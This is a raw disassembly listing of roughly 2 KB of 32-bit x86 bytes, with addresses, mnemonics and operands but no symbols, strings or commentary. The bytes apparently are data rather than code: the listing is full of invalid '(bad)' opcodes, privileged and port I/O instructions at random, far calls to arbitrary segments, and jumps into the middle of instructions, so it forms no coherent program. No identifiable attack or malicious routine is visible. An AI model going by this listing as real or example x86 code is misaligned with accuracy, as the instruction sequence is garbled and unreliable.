  403ef8:	jmp    DWORD PTR [edx-0x7bd1209]
  403efe:	sub    esi,DWORD PTR [eax+0x41]
  403f01:	adc    cl,BYTE PTR [ebx+0x4f]
  403f04:	(bad)  
  403f05:	adc    ah,BYTE PTR ds:0x27cd2b51
  403f0b:	retf   0x447a
  403f0e:	pop    es
  403f0f:	push   es
  403f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f11:	xor    al,0xe8
  403f13:	dec    esp
  403f14:	fs sahf 
  403f16:	dec    edi
  403f17:	sbb    DWORD PTR [ecx+esi*8-0x4e],ebx
  403f1b:	xchg   edi,eax
  403f1c:	call   0x91cfd9e0
  403f21:	neg    ah
  403f23:	dec    edi
  403f24:	push   ecx
  403f25:	push   0x78fa35
  403f2a:	adc    ah,BYTE PTR [esp+ebp*4-0x3]
  403f2e:	inc    esp
  403f2f:	dec    eax
  403f30:	repnz (bad) 
  403f32:	repnz fmulp st(1),st
  403f35:	fnstenv [ebx+0x31]
  403f38:	dec    esp
  403f39:	cmp    eax,0x4394207d
  403f3e:	(bad)  
  403f3f:	mov    eax,ds:0x773b7e43
  403f44:	out    dx,eax
  403f45:	and    eax,0x9f4a3f32
  403f4a:	mov    ebx,0xd3a76b95
  403f4f:	mov    dl,cl
  403f51:	cwde   
  403f52:	popf   
  403f53:	jbe    0x403f3e
  403f55:	adc    eax,0x2a899037
  403f5a:	adc    al,0x7e
  403f5c:	into   
  403f5d:	mov    ch,0x14
  403f5f:	inc    esi
  403f60:	ss cs (bad) 
  403f63:	repnz fwait
  403f65:	mov    al,ds:0xec0b244e
  403f6a:	(bad)  
  403f6b:	and    DWORD PTR [ebp-0x6c],esp
  403f6e:	gs ds out 0x66,al
  403f72:	and    al,0x71
  403f74:	bound  ecx,QWORD PTR [ecx-0x71c1d557]
  403f7a:	lea    ebp,[ecx]
  403f7c:	add    al,0x31
  403f7e:	inc    ecx
  403f7f:	aaa    
  403f80:	push   0xffffff8e
  403f82:	xchg   esp,eax
  403f83:	loope  0x403fe6
  403f85:	das    
  403f86:	mov    ds:0xbe8f2247,eax
  403f8b:	pop    ecx
  403f8c:	into   
  403f8d:	(bad)  
  403f8e:	xchg   edi,eax
  403f8f:	fwait
  403f90:	stc    
  403f91:	xchg   DWORD PTR ds:0xdd75a7f7,edx
  403f97:	stos   BYTE PTR es:[edi],al
  403f98:	and    dh,BYTE PTR [ebx-0x37a4858]
  403f9e:	push   esp
  403f9f:	(bad)  
  403fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa1:	iret   
  403fa2:	and    al,0x94
  403fa4:	xor    al,0x90
  403fa6:	(bad)  
  403fa7:	cs push ebx
  403fa9:	push   edi
  403faa:	loopne 0x403f81
  403fac:	mov    ebx,0xf27eb3
  403fb1:	lods   eax,DWORD PTR ds:[esi]
  403fb2:	push   esi
  403fb3:	out    dx,ax
  403fb5:	or     eax,0xfd23eac1
  403fba:	cmp    eax,0x9dd12555
  403fbf:	inc    eax
  403fc0:	dec    edi
  403fc1:	imul   ecx,DWORD PTR [edx-0x11c2db41],0xffffffbf
  403fc8:	mov    ds:0x30dbbf64,eax
  403fcd:	push   ds
  403fce:	(bad)  
  403fcf:	out    0xdb,eax
  403fd1:	xchg   BYTE PTR ds:[esi+0x3c],ah
  403fd5:	lods   al,BYTE PTR ds:[esi]
  403fd6:	or     esp,DWORD PTR [edi+edi*2]
  403fd9:	inc    edi
  403fda:	out    0x75,al
  403fdc:	inc    edi
  403fdd:	into   
  403fde:	loop   0x403fff
  403fe0:	dec    edi
  403fe1:	add    BYTE PTR [esi-0x61],ch
  403fe4:	sbb    DWORD PTR [ebp-0x43c77063],esi
  403fea:	daa    
  403feb:	xchg   esp,eax
  403fec:	adc    DWORD PTR [edx],eax
  403fee:	dec    ebp
  403fef:	(bad)  
  403ff0:	loop   0x403f79
  403ff2:	sti    
  403ff3:	(bad)  
  403ff4:	jl     0x403fb4
  403ff6:	dec    ebx
  403ff7:	add    ebp,DWORD PTR [edx+0x6b70c3fc]
  403ffd:	ret    0x5c3e
  404000:	inc    esi
  404001:	out    0x52,al
  404003:	jmp    0x404015
  404005:	mov    dl,0x1
  404007:	mov    bl,0xd
  404009:	out    dx,eax
  40400a:	cli    
  40400b:	adc    ch,BYTE PTR [ecx+0x16bb8885]
  404011:	mov    edi,0x2dfc00c7
  404016:	fs push 0x18acb72
  40401c:	and    al,0xe3
  40401e:	jns    0x40404e
  404020:	mov    ecx,0x70d343eb
  404025:	enter  0xb9a9,0x47
  404029:	xor    BYTE PTR [ebx+0x5f],dl
  40402c:	or     eax,0x8844089f
  404031:	push   eax
  404032:	cmp    bl,dh
  404034:	call   0xe997:0x1e9b5e61
  40403b:	sub    DWORD PTR [ebp-0x3db4b8e0],edi
  404041:	pop    ebx
  404042:	adc    bh,BYTE PTR ds:0xe15d646c
  404048:	sbb    eax,ebp
  40404a:	pop    edi
  40404b:	dec    esp
  40404c:	rcl    DWORD PTR [edx-0x62],cl
  40404f:	pop    ds
  404050:	(bad)
  404053:	jne    0x4040a1
  404055:	and    DWORD PTR [esi],ebx
  404057:	repz push 0x30
  40405a:	in     eax,dx
  40405b:	mov    WORD PTR [edx+0x28],gs
  40405e:	fs lahf 
  404060:	dec    DWORD PTR [ebx+0x5a32dc77]
  404066:	add    al,0xd0
  404068:	xchg   ebx,eax
  404069:	mov    dh,0xae
  40406b:	mov    ebp,0x9adc5a3
  404070:	in     al,0xc0
  404072:	inc    esp
  404073:	int    0xf6
  404075:	jge    0x4040c4
  404077:	dec    ecx
  404078:	fs cwde 
  40407a:	push   esi
  40407b:	jecxz  0x404046
  40407d:	pop    eax
  40407e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40407f:	sbb    BYTE PTR ds:0x7c7346f2,bl
  404085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404086:	sub    esi,esp
  404088:	shr    DWORD PTR [ebx+esi*1+0x17],1
  40408c:	push   cs
  40408d:	(bad)  
  40408e:	outs   dx,BYTE PTR ds:[esi]
  40408f:	leave  
  404090:	ja     0x4040a2
  404092:	aas    
  404093:	sub    al,0x9
  404095:	fs jmp 0xbd1c212
  40409b:	mov    al,0x7c
  40409d:	mov    bh,0x5f
  40409f:	pushf  
  4040a0:	or     bh,ch
  4040a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a3:	and    esp,edi
  4040a5:	pop    esi
  4040a6:	jae    0x4040d3
  4040a8:	xchg   ebx,eax
  4040a9:	test   DWORD PTR [edi+0x19a88284],edx
  4040af:	push   es
  4040b0:	retf   
  4040b1:	inc    ebx
  4040b2:	xor    eax,0x6c6d81cc
  4040b7:	sub    DWORD PTR [eax],ebx
  4040b9:	fwait
  4040ba:	retf   0x3252
  4040bd:	lea    edx,[esi-0x65ef3320]
  4040c3:	xchg   ebx,eax
  4040c4:	les    eax,FWORD PTR [esi-0x5d]
  4040c7:	in     al,dx
  4040c8:	jae    0x404135
  4040ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040cb:	rcr    bl,cl
  4040cd:	add    DWORD PTR [ecx+0x7d],ebx
  4040d0:	out    0xa1,al
  4040d2:	push   cs
  4040d3:	lahf   
  4040d4:	mov    dl,0x45
  4040d6:	mov    dl,0x36
  4040d8:	pop    esp
  4040d9:	sub    DWORD PTR [esi+ebp*1],esp
  4040dc:	fnstenv [ebx+edi*2+0x6239ab27]
  4040e3:	sub    al,0xfb
  4040e5:	sub    al,0x69
  4040e7:	and    DWORD PTR [eax],0xf
  4040ea:	mov    edx,0x8e7f29dd
  4040ef:	(bad)  
  4040f1:	mov    esp,0xbd911647
  4040f6:	frstor [ebx]
  4040f8:	(bad)  
  4040fa:	cmp    eax,0xa46ae5ec
  4040ff:	sbb    al,0x42
  404101:	pop    esp
  404102:	sub    ebp,DWORD PTR [edx]
  404104:	mov    al,0x95
  404106:	icebp  
  404107:	mov    esp,0xa6369439
  40410c:	cmp    al,ch
  40410e:	jle    0x4040c2
  404110:	(bad)  
  404111:	cmc    
  404112:	sbb    cl,BYTE PTR [ebx+0x3cc10b83]
  404118:	and    al,0x7d
  40411a:	mov    al,0x6a
  40411c:	jns    0x4040f9
  40411e:	push   ecx
  40411f:	cmp    ch,BYTE PTR [esi+0x0]
  404122:	cwde   
  404123:	jo     0x4040f8
  404125:	sbb    al,0xee
  404127:	mov    al,ds:0xab4c08a4
  40412c:	fadd   DWORD PTR [ebx+0x59]
  40412f:	add    DWORD PTR [esi-0x33],edi
  404132:	pop    esp
  404133:	or     BYTE PTR [esi],dl
  404135:	and    al,0xf4
  404137:	or     al,0xf7
  404139:	repnz mov bl,0x2f
  40413c:	int    0xd6
  40413e:	dec    ebp
  40413f:	nop
  404140:	mov    bh,0x89
  404142:	dec    esi
  404143:	add    dh,dh
  404145:	xchg   esi,eax
  404146:	int3   
  404147:	jge    0x404136
  404149:	cs test al,0x14
  40414c:	sahf   
  40414d:	mov    dl,0xe
  40414f:	test   BYTE PTR [edi],al
  404151:	mov    ah,0x95
  404153:	mov    ecx,0x4a52c87e
  404158:	ficom  WORD PTR [eax+0x2e]
  40415b:	jmp    0x46e7913d
  404160:	mov    WORD PTR [edx-0x33],gs
  404163:	sbb    dh,bh
  404165:	pop    eax
  404166:	in     eax,dx
  404167:	sub    DWORD PTR [ebx+0x6a],edi
  40416a:	mov    eax,ds:0xe82b30c2
  40416f:	sub    ebx,edx
  404171:	jmp    0x40412e
  404173:	fldenv [esp+ebx*8-0x71]
  404177:	mov    BYTE PTR [ebx],dh
  404179:	and    al,0x38
  40417b:	mov    ah,0x12
  40417d:	std    
  40417e:	test   BYTE PTR [ecx],0xfa
  404181:	mov    esp,0xb3642f92
  404186:	daa    
  404187:	adc    al,dh
  404189:	mov    cl,BYTE PTR [ebx+ecx*2]
  40418c:	pop    es
  40418d:	xchg   ecx,eax
  40418e:	(bad)  
  40418f:	sub    bl,bl
  404191:	sbb    DWORD PTR [edi+0x20],esp
  404194:	call   0x18eb:0x7c495461
  40419b:	pop    edi
  40419c:	in     eax,dx
  40419d:	bound  esi,QWORD PTR [edx-0x36]
  4041a0:	push   es
  4041a1:	push   ss
  4041a2:	cmp    al,0x53
  4041a4:	neg    BYTE PTR [esi+0x31]
  4041a7:	sahf   
  4041a8:	jnp    0x40415c
  4041aa:	cdq    
  4041ab:	ficom  WORD PTR [ebx+0x261bd902]
  4041b1:	or     eax,0xcb1567d2
  4041b6:	cmp    BYTE PTR [esi+0x28],0xe9
  4041ba:	and    BYTE PTR [edx+ebx*2-0x1],0x44
  4041bf:	mov    dh,0xa2
  4041c1:	out    dx,al
  4041c2:	mov    dh,0x2b
  4041c4:	mov    cl,0x40
  4041c6:	(bad)  
  4041c7:	cmc    
  4041c8:	into   
  4041c9:	adc    BYTE PTR [esi-0x395e2941],ah
  4041cf:	aaa    
  4041d0:	push   ds
  4041d1:	jo     0x40423b
  4041d3:	push   edx
  4041d4:	in     al,dx
  4041d5:	inc    ebp
  4041d6:	into   
  4041d7:	sbb    esi,esp
  4041d9:	mov    fs,WORD PTR [eax+0x5338bb59]
  4041df:	push   ebp
  4041e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041e1:	lds    ebp,FWORD PTR [eax+edi*2]
  4041e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041e5:	dec    ebp
  4041e6:	adc    ch,BYTE PTR [esi]
  4041e8:	in     al,0xb3
  4041ea:	cmc    
  4041eb:	adc    BYTE PTR [edi+0x37],dl
  4041ee:	aad    0x72
  4041f0:	nop
  4041f1:	cld    
  4041f2:	mov    eax,ds:0x639ffa1
  4041f7:	xchg   DWORD PTR [esi-0x4c],ecx
  4041fa:	inc    eax
  4041fb:	pushf  
  4041fc:	cli    
  4041fd:	jg     0x404270
  4041ff:	jbe    0x40422a
  404201:	sub    ebx,DWORD PTR [edi]
  404203:	pop    esp
  404204:	lea    edi,[eax-0x3aa0616e]
  40420a:	aad    0x76
  40420c:	fidivr WORD PTR [ebp+eax*8+0x6d]
  404210:	lahf   
  404211:	and    al,0x61
  404213:	xor    esi,ecx
  404215:	xor    dh,BYTE PTR ds:0x28068aa1
  40421b:	sbb    BYTE PTR [esi+0x132f56e9],ah
  404221:	jb     0x4041b0
  404223:	add    ch,dl
  404225:	xchg   ebx,eax
  404226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404227:	scas   al,BYTE PTR es:[edi]
  404228:	fldcw  WORD PTR [ecx+0x25b6cdf7]
  40422e:	out    0x5e,eax
  404230:	repnz and edi,esp
  404233:	mov    edx,0x66d27688
  404238:	sbb    BYTE PTR [ebx-0x71ed0fbc],0xae
  40423f:	push   cs
  404240:	test   al,0xa
  404242:	(bad)  
  404243:	or     dh,BYTE PTR [ebx+eax*4+0xc352990]
  40424a:	jo     0x404245
  40424c:	jl     0x4041fc
  40424e:	(bad)  
  40424f:	shr    esi,cl
  404251:	lea    ebx,[edx-0x78]
  404254:	jmp    0x404294
  404256:	push   esp
  404257:	sti    
  404258:	sahf   
  404259:	or     al,0xc8
  40425b:	xor    al,0xa3
  40425d:	jle    0x404235
  40425f:	jge    0x4041ee
  404261:	cmp    dl,BYTE PTR [ebp+0x17]
  404264:	adc    dx,WORD PTR [ecx]
  404267:	loope  0x4042d9
  404269:	lods   al,BYTE PTR ds:[esi]
  40426a:	mov    ebp,0x9469134b
  40426f:	cmp    dl,cl
  404271:	mov    esp,0x27821c40
  404276:	xchg   ebp,eax
  404277:	(bad)  
  404278:	out    0xec,al
  40427a:	xchg   ecx,eax
  40427b:	and    al,BYTE PTR [ecx+0x29]
  40427e:	loopne 0x404234
  404280:	aam    0x54
  404282:	inc    ebx
  404283:	mov    ebp,0xcda31a83
  404288:	xor    esi,DWORD PTR [esi-0x6f]
  40428b:	fwait
  40428c:	jnp    0x404266
  40428e:	js     0x404269
  404290:	add    ah,BYTE PTR [ebx-0x727c01fd]
  404296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404297:	in     al,dx
  404298:	push   esp
  404299:	(bad)  
  40429a:	sbb    ebx,DWORD PTR [ebx-0x62]
  40429d:	das    
  40429e:	xchg   ebp,eax
  40429f:	jno    0x404229
  4042a1:	push   cs
  4042a2:	xchg   esi,eax
  4042a3:	mov    cl,0x66
  4042a5:	pop    edx
  4042a6:	addr16 aaa 
  4042a8:	das    
  4042a9:	mov    ?,eax
  4042ab:	lds    eax,FWORD PTR ds:0xdd4175bd
  4042b1:	outs   dx,DWORD PTR ds:[esi]
  4042b2:	stos   DWORD PTR es:[edi],eax
  4042b3:	jns    0x4042ec
  4042b5:	fucomip st,st(0)
  4042b7:	shr    BYTE PTR [edx],1
  4042b9:	jnp    0x4042f5
  4042bb:	fdiv   DWORD PTR [edx+0x913a978]
  4042c1:	loopne 0x4042cc
  4042c3:	mov    ah,0x8
  4042c5:	(bad)  [edx]
  4042c7:	int    0xe
  4042c9:	and    eax,DWORD PTR [ebp+0x53]
  4042cc:	jl     0x4042ac
  4042ce:	dec    eax
  4042cf:	rcr    BYTE PTR [esi+0x14],0x30
  4042d3:	or     eax,0x4ab0c4d8
  4042d8:	xchg   esp,eax
  4042d9:	loope  0x404280
  4042db:	sti    
  4042dc:	mov    cl,0x2e
  4042de:	loope  0x404290
  4042e0:	add    bl,BYTE PTR [esi-0x1ada556f]
  4042e6:	es aas 
  4042e8:	jg     0x4042ef
  4042ea:	sar    BYTE PTR [esi+edx*1],1
  4042ed:	shr    BYTE PTR [ebx+0x51dadf5b],1
  4042f3:	cmp    DWORD PTR [ecx+0x7368d5bc],edi
  4042f9:	push   edx
  4042fa:	or     BYTE PTR ds:0x71ca4b53,ch
  404300:	or     al,0xd1
  404302:	jno    0x40429a
  404304:	int    0xc9
  404306:	cwde   
  404307:	jns    0x40432f
  404309:	sub    edx,0xb84d5b76
  40430f:	les    ecx,FWORD PTR [edx-0xfd50a23]
  404315:	xor    bl,BYTE PTR [esi+0x1e]
  404318:	or     edi,DWORD PTR [ebx]
  40431a:	mov    edi,0x9e80d28
  40431f:	fwait
  404320:	sahf   
  404321:	in     eax,dx
  404322:	into   
  404323:	aam    0xed
  404325:	leave  
  404326:	adc    BYTE PTR [edx+0xa637519],dl
  40432c:	jns    0x40438e
  40432e:	ds (bad) 
  404330:	push   esp
  404331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404332:	sti    
  404333:	pop    ebp
  404334:	dec    ebx
  404335:	jae    0x404378
  404337:	adc    eax,0xc8038e1b
  40433c:	inc    esp
  40433d:	mov    bh,0xad
  40433f:	jg     0x404396
  404341:	mov    ds:0x14932704,al
  404346:	add    al,0x2e
  404348:	test   al,0xd2
  40434a:	pop    es
  40434b:	cli    
  40434c:	mov    eax,0xd52f1b62
  404351:	pop    ss
  404352:	adc    DWORD PTR [eax-0x29],esi
  404355:	and    eax,0xdfd51cd8
  40435a:	je     0x40435d
  40435c:	fwait
  40435d:	test   eax,0xd883a99d
  404362:	pandn  mm5,mm5
  404365:	arpl   WORD PTR [ebx],bp
  404367:	sahf   
  404368:	push   ss
  404369:	xor    al,0xd
  40436b:	stos   BYTE PTR es:[edi],al
  40436c:	sub    DWORD PTR [esi*1-0x10707714],esp
  404373:	sti    
  404374:	shld   edx,eax,0xf4
  404378:	sahf   
  404379:	sub    BYTE PTR [ecx-0x75cc93b7],al
  40437f:	pop    ds
  404380:	inc    esp
  404381:	mov    BYTE PTR [edx],cl
  404383:	dec    ebx
  404384:	aam    0xdd
  404386:	les    esi,FWORD PTR [esi+0x1263af04]
  40438c:	imul   esi,DWORD PTR [esi+eiz*2+0x7],0xaa0b4773
  404394:	out    dx,eax
  404395:	scas   eax,DWORD PTR es:[edi]
  404396:	adc    edx,DWORD PTR [ebx-0x546ce99f]
  40439c:	mov    esp,0x5c4968d8
  4043a1:	sub    eax,0xfcdcbe8c
  4043a6:	pop    ecx
  4043a7:	ret    
  4043a8:	retf   0x583f
  4043ab:	pop    esi
  4043ac:	inc    ecx
  4043ad:	xor    BYTE PTR [esi+0x2c65be12],ch
  4043b3:	mov    bl,0x1a
  4043b5:	mov    ch,0x39
  4043b7:	ds mov ah,0x6d
  4043ba:	in     eax,0xeb
  4043bc:	call   0x6a7c:0x390114d
  4043c3:	dec    ebp
  4043c4:	or     BYTE PTR [ebp-0x6a],0x89
  4043c8:	jmp    0x4043fd
  4043ca:	ja     0x40440e
  4043cc:	mov    ah,0x8a
  4043ce:	aaa    
  4043cf:	xchg   ebp,ecx
  4043d1:	sbb    eax,0x79288849
  4043d6:	(bad)  
  4043d7:	test   BYTE PTR [ebx+0x1e],0x51
  4043db:	sahf   
  4043dc:	gs pushf 
  4043de:	cmp    al,0x47
  4043e0:	loopne 0x4043d1
  4043e2:	enter  0xe9c1,0xed
  4043e6:	push   cs
  4043e7:	lea    edx,[eax+0x3e326385]
  4043ed:	out    0x6b,ax
  4043f0:	push   0xffffffd0
  4043f2:	sbb    BYTE PTR [ebp+0x36848534],0x46
  4043f9:	vxorps ymm6,ymm4,YMMWORD PTR [ecx]
  4043fd:	mov    esi,eax
  4043ff:	popf   
  404400:	xchg   ebx,eax
  404401:	jp     0x4043be
  404403:	in     al,dx
  404404:	push   ebx
  404405:	retf   
  404406:	cmp    DWORD PTR [esi+0x2d],ecx
  404409:	xchg   dl,cl
  40440b:	nop
  40440c:	mov    edx,0x4e826d64
  404411:	pop    edx
  404412:	mov    WORD PTR [ebp+eiz*8+0x60],?
  404416:	adc    al,0x80
  404418:	xlat   BYTE PTR ds:[ebx]
  404419:	ins    DWORD PTR es:[edi],dx
  40441a:	mov    edi,0x938ea1a7
  40441f:	jmp    0x404497
  404421:	rcr    DWORD PTR [edx+esi*8-0x5d70d660],cl
  404428:	imul   eax,edi,0x10
  40442b:	daa    
  40442c:	arpl   WORD PTR [edx+0x9],cx
  40442f:	sbb    al,0x7
  404431:	adc    BYTE PTR fs:[ebx],cl
  404434:	mov    ah,BYTE PTR [edx+0x7d]
  404437:	xchg   DWORD PTR [ebx+0x6b],edx
  40443a:	repz ret 
  40443c:	add    eax,0xad847412
  404442:	add    dh,BYTE PTR [eax]
  404444:	sbb    BYTE PTR [edi+0x68fa6e5f],dh
  40444a:	inc    edx
  40444b:	adc    DWORD PTR [ebp+0x74],edi
  40444e:	add    bl,ah
  404450:	mov    eax,0x8ff28791
  404455:	fsub   QWORD PTR [edi]
  404457:	mov    ah,0xf5
  404459:	popf   
  40445a:	pop    edi
  40445b:	cwde   
  40445c:	inc    edx
  40445d:	js     0x4043e8
  40445f:	or     eax,0x395bcecb
  404464:	cs and eax,0x1bbb122e
  40446a:	pop    esi
  40446b:	retf   0x5cb7
  40446e:	xchg   edi,eax
  40446f:	jg     0x404435
  404471:	jmp    DWORD PTR [ecx+0x7d3a3a6]
  404477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404478:	jae    0x40445b
  40447a:	ds cs push ecx
  40447d:	xor    al,0xdf
  40447f:	jno    0x404438
  404481:	fisttp WORD PTR [esi-0x6a]
  404484:	or     eax,0x6203255b
  404489:	cmp    DWORD PTR [ecx],ebp
  40448b:	or     eax,0xc65ee8a5
  404490:	es jecxz 0x40449d
  404493:	mov    cl,0x1e
  404495:	fistp  WORD PTR [ebx-0x41]
  404498:	inc    edi
  404499:	lea    si,[ecx+edx*8-0xcd50783]
  4044a1:	mov    ecx,0xc587150
  4044a6:	xor    cl,BYTE PTR [esi-0x1386deea]
  4044ac:	(bad)  
  4044ad:	shl    DWORD PTR [eax-0x51],cl
  4044b0:	scas   al,BYTE PTR es:[edi]
  4044b1:	test   cl,bh
  4044b3:	imul   edi,eax,0xffffff94
  4044b6:	test   al,0xea
  4044b8:	xor    ch,BYTE PTR [edx+0x67b7ae81]
  4044be:	mov    dl,ah
  4044c0:	push   edi
  4044c1:	jecxz  0x4044a6
  4044c3:	sbb    eax,0xe32903d9
  4044c8:	push   0xffffffd0
  4044ca:	shl    DWORD PTR [eax],1
  4044cc:	ret    
  4044cd:	ins    BYTE PTR es:[edi],dx
  4044ce:	push   ecx
  4044cf:	bnd jno 0x404522
  4044d2:	std    
  4044d3:	adc    ebp,DWORD PTR [eax-0x2c]
  4044d6:	adc    dl,0xa8
  4044d9:	fidiv  WORD PTR [ecx+0x48]
  4044dc:	mov    esi,0x471244e5
  4044e1:	repz sbb cl,BYTE PTR [edi]
  4044e4:	inc    edi
  4044e5:	bound  eax,QWORD PTR [esi]
  4044e7:	xchg   esi,eax
  4044e8:	push   edx
  4044e9:	xlat   BYTE PTR ds:[ebx]
  4044ea:	mov    eax,ds:0x3fcf7f37
  4044ef:	icebp  
  4044f0:	in     eax,0x77
  4044f2:	inc    ebp
  4044f3:	jnp    0x4044a2
  4044f5:	push   ebx
  4044f6:	(bad)  
  4044f7:	in     al,0xdc
  4044f9:	data16 fcom QWORD PTR [esi]
  4044fc:	test   eax,0xb6e25e31
  404501:	fcomp  DWORD PTR [edi*1-0x1e93a948]
  404508:	idiv   edi
  40450a:	cmp    ebp,DWORD PTR [ecx]
  40450c:	add    eax,0x3fb075c4
  404511:	(bad)  
  404512:	jbe    0x404528
  404514:	loop   0x40453a
  404516:	ficom  WORD PTR [ebx-0x43]
  404519:	jne    0x4044ca
  40451b:	repz in al,0x15
  40451e:	std    
  40451f:	or     edx,DWORD PTR [ebp-0x42ced93a]
  404525:	loope  0x404545
  404527:	sar    BYTE PTR [edi],1
  404529:	aas    
  40452a:	push   esi
  40452b:	inc    ebx
  40452c:	add    ecx,DWORD PTR ds:0xb9442233
  404532:	out    dx,al
  404533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404534:	pop    ss
  404535:	mov    eax,DWORD PTR [edi+0x43220c1e]
  40453b:	jno    0x404548
  40453d:	and    esp,ecx
  40453f:	(bad)  
  404540:	stc    
  404541:	in     al,0x6e
  404543:	sub    DWORD PTR [eax+eax*1],eax
  404546:	and    dh,BYTE PTR [eax+ecx*8+0x113ee4b]
  40454d:	dec    edi
  40454e:	repz sub al,BYTE PTR [ebp-0x31]
  404552:	mov    ds:0x93e83ce9,eax
  404557:	sub    DWORD PTR [eax+0xb4ffb83],0x59
  40455e:	mov    dl,0xa8
  404560:	cdq    
  404561:	iret   
  404562:	cld    
  404563:	xor    BYTE PTR [edx],bl
  404565:	adc    DWORD PTR [ebp+ebx*8+0x46],edx
  404569:	adc    DWORD PTR [edx+0x17cfb7e],eax
  40456f:	loope  0x404538
  404571:	xchg   esi,eax
  404572:	ins    DWORD PTR es:[edi],dx
  404573:	pop    esp
  404574:	adc    dh,BYTE PTR [esi-0x4c]
  404577:	ins    DWORD PTR es:[edi],dx
  404578:	pop    es
  404579:	imul   ecx,ebp,0xd53333dc
  40457f:	ja     0x40455d
  404581:	clc    
  404582:	add    al,0x46
  404584:	pop    ecx
  404585:	adc    ecx,DWORD PTR [edx]
  404587:	nop
  404588:	clc    
  404589:	sti    
  40458a:	adc    DWORD PTR [edi-0x31f702a9],0x797cb0e3
  404594:	std    
  404595:	cmp    DWORD PTR [ebx],0x4500274b
  40459b:	jp     0x4045d1
  40459d:	and    DWORD PTR ds:0xeede958a,0xffffffa6
  4045a4:	mov    dh,0x66
  4045a6:	test   al,dh
  4045a8:	sub    eax,0x33a3b9a4
  4045ad:	xchg   DWORD PTR [edi-0x43],edx
  4045b0:	xor    BYTE PTR [ebx],0xe2
  4045b3:	sub    DWORD PTR [edi+0x6553ea4c],esp
  4045b9:	fld    TBYTE PTR [edi-0x7d]
  4045bc:	sub    DWORD PTR [eax+0x7a],esi
  4045bf:	aaa    
  4045c0:	lods   al,BYTE PTR ds:[esi]
  4045c1:	std    
  4045c2:	dec    ebp
  4045c3:	lahf   
  4045c4:	add    dl,BYTE PTR ds:[edx]
  4045c7:	xchg   edi,eax
  4045c8:	mov    bh,0xef
  4045ca:	jmp    0xfe83:0x86bb63c0
  4045d1:	xchg   ebx,eax
  4045d2:	mov    edi,0x453cce4e
  4045d7:	jge    0x40461c
  4045d9:	add    DWORD PTR [edi+0x69],esi
  4045dc:	add    bl,al
  4045de:	pop    eax
  4045df:	cdq    
  4045e0:	aaa    
  4045e1:	inc    ebx
  4045e2:	sub    ecx,esp
  4045e4:	and    edi,DWORD PTR [eax+0x44]
  4045e7:	int3   
  4045e8:	mov    bh,0xfa
  4045ea:	inc    ebp
  4045eb:	(bad)  
  4045ec:	jmp    0x40460b
  4045ee:	fcomp  DWORD PTR [eax]
  4045f0:	je     0x404610
  4045f2:	cmp    al,0xe8
  4045f4:	aas    
  4045f5:	mov    edx,0xc871dd43
  4045fa:	mov    cs,WORD PTR [ebx]
  4045fc:	fild   WORD PTR [eax]
  4045fe:	xchg   edx,eax
  4045ff:	inc    edx
  404600:	and    BYTE PTR [esp+ecx*8+0x51],bl
  404604:	mov    ebp,0xe1495ed2
  404609:	push   eax
  40460a:	sbb    cl,bl
  40460c:	pop    ds
  40460d:	stos   BYTE PTR es:[edi],al
  40460e:	xor    dh,BYTE PTR [esi]
  404610:	xor    dh,BYTE PTR [ecx+0x19]
  404613:	xchg   ecx,eax
  404614:	add    ecx,esi
  404616:	mov    eax,eax
  404618:	cmp    al,0x70
  40461a:	jae    0x4045a5
  40461c:	mov    edx,DWORD PTR [ecx-0x7725b9b1]
  404622:	push   ecx
  404623:	mov    ebx,0xcad81ce6
  404628:	xor    eax,esi
  40462a:	jp     0x404695
  40462c:	int3   
  40462d:	xlat   BYTE PTR ds:[ebx]
  40462e:	enter  0xa1db,0xde
  404632:	retf   0x7aef
  404635:	inc    ebx
  404636:	mov    esi,0x47103b8e
  40463b:	icebp  
  40463c:	loopne 0x404686
  40463e:	or     ecx,DWORD PTR [edx]
  404640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404641:	aaa    
  404642:	add    dh,ch
  404644:	popf   
  404645:	sub    ebx,DWORD PTR [esi-0x44]
  404648:	add    ebx,edx
  40464a:	ret    
  40464b:	fiadd  DWORD PTR [ecx]
  40464d:	xor    esi,DWORD PTR [ebp+0x777fb8ee]
  404653:	mov    ecx,DWORD PTR [ebx+0x2e]
  404656:	popa   
  404657:	sti    
  404658:	xchg   esi,eax
  404659:	aam    0xa6
  40465b:	jno    0x404619
  40465d:	hlt    
  40465e:	es enter 0x16eb,0x33
  404663:	dec    esp
  404664:	faddp  st(3),st
  404666:	in     eax,dx
  404667:	dec    ecx
  404668:	inc    ecx
  404669:	and    ecx,edi
  40466b:	es loop 0x4046bf
  40466e:	aad    0x3e
  404670:	in     al,0xf1
  404672:	pop    ss
  404673:	dec    ebx
  404674:	out    dx,eax
  404675:	sbb    al,0x7
  404677:	mul    BYTE PTR [edx+0x698c6a40]
  40467d:	sbb    eax,0xf30e011c
  404682:	sub    eax,0xa257e307
  404687:	pusha  
  404688:	pusha  
  404689:	adc    BYTE PTR [ebp+0x33],cl
  40468c:	sub    eax,0xf5e397c8
  404691:	or     bh,ch
  404693:	pop    ecx
  404694:	rcr    DWORD PTR [edx+0x12e2bc7e],1
  40469a:	fimul  DWORD PTR [ebx-0x4f2c6dd0]
  4046a0:	mov    dh,0x92
  4046a2:	lahf   
  4046a3:	js     0x4046c1
  4046a5:	mov    ds:0x9d7004fc,al
  4046aa:	cmp    eax,0xb25983dd
  4046af:	int3   
  4046b0:	enter  0xd0de,0x39
  4046b4:	sub    esp,DWORD PTR [ecx-0x5a]
  4046b7:	fmul   DWORD PTR [edx+0x31]
  4046ba:	lahf   
  4046bb:	pushf  
  4046bc:	iret   
  4046bd:	sub    ebx,DWORD PTR [ebx+eax*1]
  4046c0:	in     al,0xdf
  4046c2:	out    0xa3,eax
  4046c4:	sbb    eax,0x5d243a99
